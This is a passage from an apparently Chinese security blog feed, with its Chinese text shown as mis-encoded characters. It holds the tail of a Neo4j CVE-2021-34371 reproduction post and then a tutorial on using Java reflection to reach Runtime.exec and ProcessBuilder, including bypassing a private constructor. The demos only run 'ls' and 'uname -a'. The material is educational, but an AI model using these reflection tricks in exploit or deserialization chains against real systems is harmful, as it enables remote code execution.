LifeSupport$LifecycleInstance (org.neo4j.kernel.lifecycle)</span><br><span class="line">start:107, LifeSupport (org.neo4j.kernel.lifecycle)</span><br><span class="line">start:212, AbstractNeoServer (org.neo4j.server)</span><br><span class="line">start:111, ServerBootstrapper (org.neo4j.server)</span><br><span class="line">start:79, ServerBootstrapper (org.neo4j.server)</span><br><span class="line">main:32, CommunityEntryPoint (org.neo4j.server)</span><br></pre></td></tr></table></figure>



<p>ä¾æ—§ä¸æ¸…æ¥šçš„æ˜¯ä¸ºä»€ä¹ˆæ²¡æœ‰æ–­åœ¨é‚£ä¸ª<code> setSessionVariable</code>çš„æ–¹æ³•ä¸­</p>
<p>ä½†æ ¹æ®payloadçœ‹é€ æˆæ¼æ´çš„ä»£ç å°±æ˜¯è¿™ä¸ªå‡½æ•°é€šè¿‡rmiè½½å…¥äº†æ¶æ„äº†å¯¹è±¡ã€‚</p>
<p>ç„¶åæ ¹æ®rmiè‡ªåŠ¨ååºåˆ—åŒ–å¯¼è‡´äº†rce</p>
<p>ç„¶åæ–°ç‰ˆæœ¬çš„ä¿®å¤æ˜¯ç›´æ¥æŠŠè¿™ä¸ªç±»ç»™åˆ äº†ï¼Œdiffä¸­çœ‹ä¸åˆ°ç›´æ¥çš„ä¿®å¤</p>
<h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-34371">https://nvd.nist.gov/vuln/detail/CVE-2021-34371</a></li>
<li><a href="https://www.exploit-db.com/exploits/50170">https://www.exploit-db.com/exploits/50170</a></li>
</ul>
]]></content>
      <categories>
        <category>æ¼æ´å¤ç°</category>
      </categories>
      <tags>
        <tag>cve</tag>
      </tags>
  </entry>
  <entry>
    <title>ä»Javaåå°„æœºåˆ¶åˆ°RCE</title>
    <url>/2021/11/05/%E4%BB%8EJava%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%88%B0RCE/</url>
    <content><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ä¹‹å‰Javaå­¦äº†ä¸ªå¯‚å¯ï¼Œå¾ˆå¤šä¸œè¥¿éƒ½æ²¡æœ‰æ¶‰åŠåˆ°ï¼Œåšé¡¹ç›®ä¹Ÿåªæ˜¯å†™ä¸šåŠ¡é€»è¾‘CRUDæ²¡æ¶‰åŠåˆ°å¾ˆå¤šJavaç‰¹æ€§ï¼Œä¸€è¾¹æ•´ç†å§¿åŠ¿ä¸€è¾¹äº†è§£ä¸‹Javaå‚è€ƒ</p>
<p>æœ¬æ–‡å‚è€ƒäº†<a href="https://www.guildhab.top/2020/04/java-rmi-%e5%88%a9%e7%94%a82-java-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e/">Epicccal</a>å¸ˆå‚…çš„æ–‡ç« </p>
<h2 id="Java-åå°„"><a href="#Java-åå°„" class="headerlink" title="Java åå°„"></a>Java åå°„</h2><p>å®šä¹‰å¦‚ä¸‹ï¼š</p>
<blockquote>
<p><strong>Java åå°„æœºåˆ¶æ˜¯æŒ‡åœ¨ç¨‹åºè¿è¡Œæ—¶ , å¯¹äºä»»ä½•ä¸€ä¸ªç±» , éƒ½èƒ½çŸ¥é“è¿™ä¸ªç±»çš„æ‰€æœ‰å±æ€§å’Œæ–¹æ³• , å¯¹äºä»»ä½•ä¸€ä¸ªå®ä¾‹å¯¹è±¡ , éƒ½èƒ½è°ƒç”¨è¯¥å¯¹è±¡çš„ä»»ä½•ä¸€ä¸ªå±æ€§å’Œæ–¹æ³• .</strong></p>
<p><strong>Javaä¸­è¿™ç§ â€œ åŠ¨æ€è·å–ä¿¡æ¯ â€œ å’Œ â€œ åŠ¨æ€è°ƒç”¨å±æ€§æ–¹æ³• â€œ çš„æœºåˆ¶è¢«ç§°ä¸º Java åå°„æœºåˆ¶.</strong></p>
<p><strong>å®ä¾‹å¯¹è±¡å¯ä»¥é€šè¿‡åå°„æœºåˆ¶è·å–å®ƒçš„ç±» , ç±»å¯ä»¥é€šè¿‡åå°„æœºåˆ¶è·å–å®ƒçš„æ‰€æœ‰æ–¹æ³•å’Œå±æ€§ . è·å–çš„å±æ€§å¯ä»¥è®¾å€¼ , è·å–çš„æ–¹æ³•å¯ä»¥è°ƒç”¨ .</strong></p>
</blockquote>
<p>ç®€å•åœ°æ¥è¯´å°±æ˜¯è¡¥å……äº†Javaä½œä¸ºé™æ€è¯­è¨€åœ¨è°ƒç”¨æ–¹æ³•å’Œå±æ€§ä¸Šä¸çµæ´»çš„ç¼ºç‚¹ï¼Œé€šè¿‡è¿™ç§æœºåˆ¶å¾—ä»¥åŠ¨æ€çš„åˆ›å»ºå¯¹è±¡å’Œè°ƒç”¨å…¶æ–¹æ³•å±æ€§(å†™åˆ°è¿™é‡Œæœ‰ä¸ªç–‘é—®ï¼‚æ‰“æ–­ç‚¹çš„æ—¶å€™èƒ½è®¿é—®å¯¹è±¡å±æ€§æ˜¯ä¸æ˜¯å°±æ˜¯å› ä¸ºè¿™ä¸ªåå°„æœºåˆ¶çš„å­˜åœ¨ï¼‚)</p>
<span id="more"></span>

<p>Javaåå°„çš„æœºåˆ¶çš„åŠŸèƒ½:</p>
<ol>
<li>åœ¨ç¨‹åºè¿è¡Œæ—¶æŸ¥æ‰¾ä¸€ä¸ªå¯¹è±¡æ‰€å±ç±»</li>
<li>åœ¨ç¨‹åºè¿è¡Œæ—¶æŸ¥æ‰¾ä»»æ„ä¸€ä¸ªç±»çš„æˆå‘˜å˜é‡å’Œæ–¹æ³•</li>
<li>åœ¨ç¨‹åºè¿è¡Œæ—¶æ„é€ ä»»æ„ä¸€ä¸ªç±»çš„å¯¹è±¡</li>
<li>åœ¨ç¨‹åºè¿è¡Œæ—¶è°ƒç”¨ä»»æ„ä¸€ä¸ªæ–¹æ³•çš„å¯¹è±¡</li>
</ol>
<h3 id="æŸ¥æ‰¾ä¸€ä¸ªå¯¹è±¡æ‰€å±ç±»"><a href="#æŸ¥æ‰¾ä¸€ä¸ªå¯¹è±¡æ‰€å±ç±»" class="headerlink" title="æŸ¥æ‰¾ä¸€ä¸ªå¯¹è±¡æ‰€å±ç±»"></a>æŸ¥æ‰¾ä¸€ä¸ªå¯¹è±¡æ‰€å±ç±»</h3><ul>
<li><code>obj.getClass()</code></li>
<li><code>obj.forName(className)</code></li>
<li><code>className.class</code></li>
</ul>
<h3 id="æŸ¥æ‰¾ä¸€ä¸ªç±»çš„æ–¹æ³•"><a href="#æŸ¥æ‰¾ä¸€ä¸ªç±»çš„æ–¹æ³•" class="headerlink" title="æŸ¥æ‰¾ä¸€ä¸ªç±»çš„æ–¹æ³•"></a>æŸ¥æ‰¾ä¸€ä¸ªç±»çš„æ–¹æ³•</h3><ul>
<li><code>className.getMethod(functionName , [parameterTypes.class])</code></li>
<li><code>className.getMethods()</code></li>
<li><code>className.getDeclaredMethods()</code></li>
</ul>
<h3 id="æ„é€ ä»»æ„ä¸€ä¸ªç±»çš„å¯¹è±¡"><a href="#æ„é€ ä»»æ„ä¸€ä¸ªç±»çš„å¯¹è±¡" class="headerlink" title="æ„é€ ä»»æ„ä¸€ä¸ªç±»çš„å¯¹è±¡"></a>æ„é€ ä»»æ„ä¸€ä¸ªç±»çš„å¯¹è±¡</h3><ul>
<li><p><code>className.newInstance()</code>è¿™ä¸ªæ–¹æ³•å·²è¢«åºŸå¼ƒï¼Œä½†ä¸å½±å“ä½¿ç”¨</p>
<p>ä½¿ç”¨è¿™ä¸ªå‡½æ•°çš„æ—¶å€™é»˜è®¤ä¼šè°ƒç”¨æ— å‚æ•°çš„æ„é€ å‡½æ•°</p>
<p>æ‰§è¡Œå‰æï¼š</p>
<ol>
<li>ç±»å¿…é¡»è¦æœ‰æ— å‚æ„é€ å‡½æ•° .</li>
<li>ç±»çš„æ„é€ å‡½æ•°ä¸èƒ½æ˜¯ç§æœ‰çš„ , ä¹Ÿå°±æ˜¯ä¸èƒ½é€šè¿‡ â€œ<code>private</code>â€œ ä¿®é¥°ç¬¦æ¥ä¿®é¥°æ„é€ å‡½æ•° .</li>
</ol>
</li>
<li><p><code>className.getConstructor( parameterType ).newInstance( parameterName )</code></p>
<p>ã€€ä¼šè¿”å›æ‰€æœ‰æ„é€ æ–¹æ³•çš„ä¸€ä¸ªå­é›†ï¼Œå³publicä¿®é¥°ç¬¦ä¿®é¥°çš„</p>
</li>
</ul>
<h3 id="è°ƒç”¨ä»»æ„ä¸€ä¸ªå®ä¾‹å¯¹è±¡çš„æ–¹æ³•"><a href="#è°ƒç”¨ä»»æ„ä¸€ä¸ªå®ä¾‹å¯¹è±¡çš„æ–¹æ³•" class="headerlink" title="è°ƒç”¨ä»»æ„ä¸€ä¸ªå®ä¾‹å¯¹è±¡çš„æ–¹æ³•"></a>è°ƒç”¨ä»»æ„ä¸€ä¸ªå®ä¾‹å¯¹è±¡çš„æ–¹æ³•</h3><ul>
<li><code>Method.invoke(obj , args[])</code></li>
</ul>
<p>demo:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">reflectTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">print</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InstantiationException, IllegalAccessException, NoSuchMethodException,</span></span><br><span class="line"><span class="function">            ClassNotFoundException, InvocationTargetException </span>&#123;</span><br><span class="line"></span><br><span class="line">        String name = <span class="string">&quot;harry&quot;</span>;</span><br><span class="line">        <span class="comment">// Class.forName()è¿”å›ä¸€ä¸ªç±»</span></span><br><span class="line">        Class&lt;?&gt; cls = Class.forName(<span class="string">&quot;reflectTest&quot;</span>);</span><br><span class="line">        <span class="comment">// newInstance()æˆ–è€…getDeclaredConstructor().newInstance()</span></span><br><span class="line">        <span class="comment">// è¿”å›ä¸€ä¸ªå®ä¾‹ï¼Œç±»çš„å®ä¾‹åŒ–å³å¯¹è±¡</span></span><br><span class="line">        <span class="comment">// reflectTest obj = (reflectTest) cls.newInstance();</span></span><br><span class="line">        reflectTest obj = (reflectTest) cls.getDeclaredConstructor().newInstance();</span><br><span class="line">        <span class="comment">// getmethodè·å–ä¸€ä¸ªç±»çš„æ‰€æœ‰æ–¹æ³•ï¼Œinvokeç”¨äºè°ƒç”¨ä»»æ„ä¸€ä¸ªå®ä¾‹çš„æ–¹æ³•</span></span><br><span class="line">        Object ret = cls.getMethod(<span class="string">&quot;print&quot;</span>, String.class).invoke(obj, name);</span><br><span class="line">        System.out.println(ret);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><p>åŸºæœ¬è¿‡ç¨‹ï¼š</p>
<ol>
<li><p>è·å–å‘½ä»¤æ‰§è¡Œçš„ç±»ï¼Œä½¿ç”¨<code>Class.forName()</code></p>
</li>
<li><p>æŸ¥çœ‹ç±»ä¸­æ‰€æœ‰æ–¹æ³•,ä½¿ç”¨<code>className.getMethods()</code></p>
</li>
<li><p>æ‰¾åˆ°å¯åˆ©ç”¨çš„æ–¹æ³•æ„é€ invoke,<code>Method.invoke(obj , args[])</code></p>
<p>objæ˜¯æ„é€ å‡ºæ¥çš„ç±»ï¼Œmethodæ˜¯æƒ³è¦æ‰§è¡Œçš„æ–¹æ³•ï¼Œargsæ˜¯éœ€æ‰§è¡Œçš„å‘½ä»¤</p>
<p><strong>æ­£å¸¸æƒ…å†µè®¿é—®æ˜¯ã€€é™æ€æ–¹æ³•ï¼š<code>ç±»å.æ–¹æ³•å</code>ã€€æˆå‘˜å‡½æ•°ï¼š<code>å¯¹è±¡å.æ–¹æ³•å</code></strong></p>
<p><strong>invokeå°±ç›¸å½“äºåè¿‡æ¥ï¼Œ<code>æ–¹æ³•å.invoke(ç±»å)</code>æˆ–è€…<code>æ–¹æ³•å.invoke(å¯¹è±¡å)</code></strong></p>
</li>
</ol>
<p>å¯ä»¥åˆ©ç”¨çš„ç±»ä¸€èˆ¬æœ‰ä¸¤ç§ï¼š</p>
<ol>
<li><code>java.lang.RunTime</code></li>
<li><code>java.lang.ProcessBuilder</code></li>
</ol>
<h3 id="æ— å‚RCE"><a href="#æ— å‚RCE" class="headerlink" title="æ— å‚RCE"></a>æ— å‚RCE</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">reflect2RCE</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">reflect2RCE</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> ClassNotFoundException, IOException, NoSuchMethodException, InstantiationException,</span></span><br><span class="line"><span class="function">            IllegalAccessException, ClassNotFoundException, IllegalArgumentException, InvocationTargetException </span>&#123;</span><br><span class="line">        <span class="comment">// è·å–java.lang.Runtimeçš„ç±»</span></span><br><span class="line">        Class&lt;?&gt; cls = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;é€šè¿‡Class.forName()æ–¹æ³•è·å–ä»»æ„ç±»&quot;</span> + cls);</span><br><span class="line">        <span class="comment">// é€šè¿‡getMethods,çœ‹çœ‹ç±»ä¸­æœ‰å•¥å¯ä»¥åˆ©ç”¨çš„</span></span><br><span class="line">        Method[] methods = cls.getMethods();</span><br><span class="line">        <span class="keyword">for</span> (Method m : methods) &#123;</span><br><span class="line">            System.out.println(m);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// åŒæ ·åœ°getDeclaredMethodsä¹Ÿå¯ä»¥çœ‹</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1636116274881-2021-11-520:44:34.png"></p>
<p>ç„¶åå’Œåˆšåˆšä¸€æ ·è¯•ç€invokeè°ƒç”¨execæ–¹æ³•ï¼</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// è·å–java.lang.Runtimeçš„ç±»</span></span><br><span class="line">Class&lt;?&gt; cls = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">Object obj = cls.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(cls.newInstance(), <span class="string">&quot;ls&quot;</span>);</span><br></pre></td></tr></table></figure>



<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1636117041051-2021-11-520:57:21.png"></p>
<p>æŠ¥é”™ï¼Œå› ä¸ºè¿™ä¸ª<code>java.lang.Runtime</code>ä¸­æ„é€ å‡½æ•°æ˜¯ç§æœ‰çš„ï¼ˆClassName.instance()è¿™ä¸ªå‡½æ•°ä¼šè°ƒè‡ªåŠ¨ç”¨çš„æ— å‚æ„é€ å‡½æ•°ï¼‰</p>
<p>ç»•è¿‡ï¼š</p>
<blockquote>
<p>ä½¿ç”¨åå°„æ—¶ï¼Œç±»åˆå§‹åŒ–çš„æ—¶å€™ä¼šå¯¹ç±»ä¸­æ‰€æœ‰çš„é™æ€æ–¹æ³•è¿›è¡Œè°ƒç”¨ï¼Œä¸‹å›¾æ˜¯æºç ï¼Œæ‰€ä»¥åªè¦å®Œæˆä¸€ä¸ªruntimeç±»çš„åˆå§‹åŒ–å³å¯</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">reflect2RCE</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">reflect2RCE</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">     <span class="comment">// ä½¿ç”¨java.lang.runtimeæ¥è¿›è¡Œåå°„</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">reflect_runtime</span><span class="params">()</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> ClassNotFoundException, IOException, NoSuchMethodException, InstantiationException,</span></span><br><span class="line"><span class="function">            IllegalAccessException, ClassNotFoundException, IllegalArgumentException, InvocationTargetException </span>&#123;</span><br><span class="line">        <span class="comment">// è·å–java.lang.Runtimeçš„ç±»</span></span><br><span class="line">        Class&lt;?&gt; cls = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        <span class="comment">// System.out.println(&quot;é€šè¿‡Class.forName()æ–¹æ³•è·å–ä»»æ„ç±»&quot; + cls);</span></span><br><span class="line">        <span class="comment">// é€šè¿‡getMethods,çœ‹çœ‹ç±»ä¸­æœ‰å•¥å¯ä»¥åˆ©ç”¨çš„</span></span><br><span class="line">        <span class="comment">// Method[] methods = cls.getMethods();</span></span><br><span class="line">        <span class="comment">// for (Method m : methods) &#123;</span></span><br><span class="line">        <span class="comment">// System.out.println(m);</span></span><br><span class="line">        <span class="comment">// &#125;</span></span><br><span class="line">        <span class="comment">// åŒæ ·åœ°getDeclaredMethodsä¹Ÿå¯ä»¥çœ‹</span></span><br><span class="line">        <span class="comment">// Object obj = cls.getMethod(&quot;exec&quot;, String.class).invoke(cls.newInstance(),</span></span><br><span class="line">        <span class="comment">// args);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// è·å–æ–¹æ³•(getRuntime,execï¼‰</span></span><br><span class="line">        Method mGetRuntime = cls.getMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line">        Method mExec = cls.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">        <span class="comment">// è·å–runtimeçš„å®ä¾‹å¯¹è±¡ï¼Œæ— æ³•é€šè¿‡æ— å‚æ•°æ„é€ å‡½æ•°æ„é€ å¯¹è±¡å°±ç»•è¿‡ï¼Œé€šè¿‡é™æ€æ–¹æ³•æ‰§è¡Œ</span></span><br><span class="line">        <span class="comment">// ï¼ˆä»¥ Java åå°„ä¸ºä¾‹ , åœ¨ç±»åˆå§‹åŒ–æ—¶ä¼šæ‰§è¡Œ static&#123;&#125; ä»£ç å—ä¸­çš„å†…å®¹ï¼‰</span></span><br><span class="line">        Object obj = mGetRuntime.invoke(<span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Process p = (Process) mExec.invoke(obj, <span class="string">&quot;ls&quot;</span>);</span><br><span class="line">        <span class="comment">// è¯»å–å‘½ä»¤æ‰§è¡Œçš„æ–‡ä»¶æµç„¶åæ‰“å°</span></span><br><span class="line">        InputStream is = p.getInputStream();</span><br><span class="line">        InputStreamReader isr = <span class="keyword">new</span> InputStreamReader(is);</span><br><span class="line">        BufferedReader br = <span class="keyword">new</span> BufferedReader(isr);</span><br><span class="line">        String line = <span class="keyword">null</span>;</span><br><span class="line">        <span class="comment">// System.out.print(obj);</span></span><br><span class="line">        <span class="keyword">while</span> ((line = br.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">            System.out.println(line);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> ClassNotFoundException, IOException, NoSuchMethodException, InstantiationException,</span></span><br><span class="line"><span class="function">            IllegalAccessException, ClassNotFoundException, IllegalArgumentException, InvocationTargetException </span>&#123;</span><br><span class="line">                reflect2RCE r = <span class="keyword">new</span> reflect2RCE();</span><br><span class="line">        		r.reflect_runtime();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1636118142763-2021-11-521:15:42.png"></p>
<p>RCEæˆåŠŸ</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1636118050871-2021-11-521:14:10.png"></p>
<h4 id="å¦‚ä½•è®¿é—®ç§æœ‰æ–¹æ³•"><a href="#å¦‚ä½•è®¿é—®ç§æœ‰æ–¹æ³•" class="headerlink" title="å¦‚ä½•è®¿é—®ç§æœ‰æ–¹æ³•"></a>å¦‚ä½•è®¿é—®ç§æœ‰æ–¹æ³•</h4><p>ä¹‹å‰çš„è°ƒç”¨Runtimeæ‰§è¡Œç³»ç»Ÿå‘½ä»¤æ²¡æœ‰ç›´æ¥è°ƒç”¨å®ƒçš„é‚£ä¸ªç§æœ‰æ–¹æ³•ï¼Œè€Œæ˜¯é€šè¿‡ <code>java.lang.Runtime</code> æ‰§è¡Œç³»ç»Ÿå‘½ä»¤æ—¶ , ç”±äºè¯¥ç±»çš„æ„é€ æ–¹æ³• <code>Runtime()</code> æ˜¯ä¸€ä¸ªç§æœ‰æ–¹æ³• , æ‰€ä»¥æˆ‘ä»¬ä¸èƒ½è°ƒç”¨è¯¥æ–¹æ³• , åªèƒ½é€šè¿‡ <code>getRuntime()</code> é™æ€æ–¹æ³•æ¥è¿”å›ä¸€ä¸ª <code>Runtime</code> å®ä¾‹å¯¹è±¡ , ç„¶åå†è°ƒç”¨ <code>exec()</code> æ–¹æ³•</p>
<ul>
<li><p><code>className.getDeclaredConstructor()</code></p>
<p>ä¼šè¿”å›æ‰€æœ‰çš„æ„é€ æ–¹æ³•ï¼ŒåŒ…æ‹¬protected,private.</p>
<p>è®¿é—®ç§æœ‰ç±»å¯ä»¥å°†æ­¤å‡½æ•°çš„è¿”å›å€¼(Constructor &lt;?&gt; )é™„åŠ ä¸€ä¸ªå‚æ•°<code>className.setAccessible(true);</code></p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ä½¿ç”¨java.lang.runtimeæ¥è¿›è¡Œåå°„</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">reflect_runtime</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> ClassNotFoundException, IOException, NoSuchMethodException, InstantiationException,</span></span><br><span class="line"><span class="function">        IllegalAccessException, ClassNotFoundException, IllegalArgumentException, InvocationTargetException </span>&#123;</span><br><span class="line">    <span class="comment">// è·å–java.lang.Runtimeçš„ç±»</span></span><br><span class="line">    Class&lt;?&gt; cls = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">    Method mExec = cls.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ‰§è¡Œç§æœ‰å‡½æ•°ï¼Œéè¿”å›ä¸€ä¸ªruntimeæ–¹æ³•è°ƒç”¨é™æ€æ–¹æ³•çš„å½¢å¼</span></span><br><span class="line">    Constructor&lt;?&gt; cst = cls.getDeclaredConstructor();</span><br><span class="line">    <span class="comment">//è¯¥å€¼ä¸ºçœŸæ—¶è¡¨ç¤ºåå°„çš„å¯¹è±¡åœ¨ä½¿ç”¨æ—¶åº”ä¼šç¦æ­¢javaçš„è¯­æ³•è®¿é—®æ£€æŸ¥</span></span><br><span class="line">    <span class="comment">//å³public protect privateæ— æ•ˆ</span></span><br><span class="line">    cst.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    Object obj = cst.newInstance();</span><br><span class="line"></span><br><span class="line">    Process p = (Process) mExec.invoke(obj, <span class="string">&quot;ls&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// è¯»å–å‘½ä»¤æ‰§è¡Œçš„æ–‡ä»¶æµç„¶åæ‰“å°</span></span><br><span class="line">    InputStream is = p.getInputStream();</span><br><span class="line">    InputStreamReader isr = <span class="keyword">new</span> InputStreamReader(is);</span><br><span class="line">    BufferedReader br = <span class="keyword">new</span> BufferedReader(isr);</span><br><span class="line">    String line = <span class="keyword">null</span>;</span><br><span class="line">    <span class="comment">// System.out.print(obj);</span></span><br><span class="line">    <span class="keyword">while</span> ((line = br.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">        System.out.println(line);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="å¸¦å‚RCE"><a href="#å¸¦å‚RCE" class="headerlink" title="å¸¦å‚RCE"></a>å¸¦å‚RCE</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">reflect2RCE</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">reflect2RCE</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä½¿ç”¨java.lang.ProcessBuilder</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">reflect_processBuilder</span><span class="params">()</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> ClassNotFoundException, IOException, NoSuchMethodException, InstantiationException,</span></span><br><span class="line"><span class="function">            IllegalAccessException, ClassNotFoundException, IllegalArgumentException, InvocationTargetException </span>&#123;</span><br><span class="line">        <span class="comment">// æ— å‚æ•°å‘½ä»¤</span></span><br><span class="line">        Class&lt;?&gt; cls = Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">        <span class="comment">// Object obj = cls.getConstructor(List.class).newInstance(Arrays.asList(&quot;ls&quot;));</span></span><br><span class="line">        Method startCmd = cls.getMethod(<span class="string">&quot;start&quot;</span>);</span><br><span class="line">        <span class="comment">// å¸¦å‚å‘½ä»¤</span></span><br><span class="line">        Object obj = cls.getConstructor(List.class).newInstance(Arrays.asList(<span class="string">&quot;uname&quot;</span>, <span class="string">&quot;-a&quot;</span>));</span><br><span class="line"></span><br><span class="line">        Process p = (Process) startCmd.invoke(obj);</span><br><span class="line">        <span class="comment">// è¯»å–å‘½ä»¤æ‰§è¡Œçš„æ–‡ä»¶æµç„¶åæ‰“å°</span></span><br><span class="line">        InputStream is = p.getInputStream();</span><br><span class="line">        InputStreamReader isr = <span class="keyword">new</span> InputStreamReader(is);</span><br><span class="line">        BufferedReader br = <span class="keyword">new</span> BufferedReader(isr);</span><br><span class="line">        String line = <span class="keyword">null</span>;</span><br><span class="line">        <span class="comment">// System.out.print(obj);</span></span><br><span class="line">        <span class="keyword">while</span> ((line = br.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">            System.out.println(line);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InstantiationException,</span></span><br><span class="line"><span class="function">            IllegalAccessException, IllegalArgumentException, InvocationTargetException, IOException </span>&#123;</span><br><span class="line">        reflect2RCE r = <span class="keyword">new</span> reflect2RCE();</span><br><span class="line">        <span class="comment">//è°ƒç”¨reflect_processBuilder();        </span></span><br><span class="line">        r.reflect_processBuilder();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1636176345817-2021-11-613:25:45.png"></p>
<h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>é€šè¿‡åå°„æ¥æ‰§è¡ŒRCEçš„åŸºæœ¬æµç¨‹å°±æ˜¯</p>
<ol>
<li>æ„é€ å­˜åœ¨RCEçš„ç±»</li>
<li>æ„é€ å­˜åœ¨RCEç±»ä¸­å…·ä½“æ–¹æ³•method</li>
<li>æ„é€ æ­¤ç±»çš„å®ä¾‹å¯¹è±¡obj</li>
<li>ç”¨å®ä¾‹å¯¹è±¡objå’Œå…·ä½“æ–¹æ³•methodä½¿ç”¨invokeæ‰§è¡ŒRCE</li>
</ol>
